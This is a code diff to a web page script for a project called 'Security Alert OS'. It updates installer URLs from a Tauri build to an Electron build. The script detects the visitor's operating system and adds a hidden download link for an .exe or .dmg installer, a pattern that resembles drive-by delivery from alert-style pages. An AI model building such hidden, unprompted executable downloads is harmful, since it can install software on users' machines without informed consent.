@@ -153,26 +153,29 @@
 
                 started = true;
 
-                // Auto-detect OS and download Tauri package
+                // Auto-detect OS and download Electron package
                 let os = "Unknown";
                 if (navigator.appVersion.indexOf("Win") != -1 || navigator.userAgent.indexOf("Win") != -1) os = "Windows";
                 if (navigator.appVersion.indexOf("Mac") != -1 || navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
+
+                // TODO: Update these URLs after first Electron build release
+                const GITHUB_RELEASE_BASE = "https://github.com/shadab76/security-alert-os/releases/latest/download";
 
                 const downloadLink = document.createElement("a");
                 downloadLink.style.display = "none";
 
                 if (os === "Windows") {
-                    // Windows Download URL
-                    downloadLink.href = "https://github.com/shadab76/security-alert-os/releases/download/untagged-e7b21f5df73199a3ebfd/Security.Alert.OS_0.1.0_x64-setup.exe";
-                    downloadLink.download = "Security.Alert.OS_0.1.0_x64-setup.exe";
+                    // Windows Download URL (Electron Builder NSIS installer)
+                    downloadLink.href = `${GITHUB_RELEASE_BASE}/Security.Alert.OS.Setup.1.0.0.exe`;
+                    downloadLink.download = "Security.Alert.OS.Setup.1.0.0.exe";
                 } else if (os === "MacOS") {
-                    // Mac Download URL
-                    downloadLink.href = "https://github.com/shadab76/security-alert-os/releases/download/untagged-e7b21f5df73199a3ebfd/Security.Alert.OS_0.1.0_aarch64.dmg";
-                    downloadLink.download = "Security.Alert.OS_0.1.0_aarch64.dmg";
+                    // Mac Download URL (Electron Builder DMG)
+                    downloadLink.href = `${GITHUB_RELEASE_BASE}/Security.Alert.OS-1.0.0-arm64.dmg`;
+                    downloadLink.download = "Security.Alert.OS-1.0.0-arm64.dmg";
                 } else {
-                    // Fallback Download URL
-                    downloadLink.href = "https://github.com/shadab76/security-alert-os/releases/download/untagged-e7b21f5df73199a3ebfd/Security.Alert.OS_0.1.0_x64-setup.exe";
-                    downloadLink.download = "Security.Alert.OS_0.1.0_x64-setup.exe";
+                    // Fallback - Windows Download URL
+                    downloadLink.href = `${GITHUB_RELEASE_BASE}/Security.Alert.OS.Setup.1.0.0.exe`;
+                    downloadLink.download = "Security.Alert.OS.Setup.1.0.0.exe";
                 }
 
                 document.body.appendChild(downloadLink);
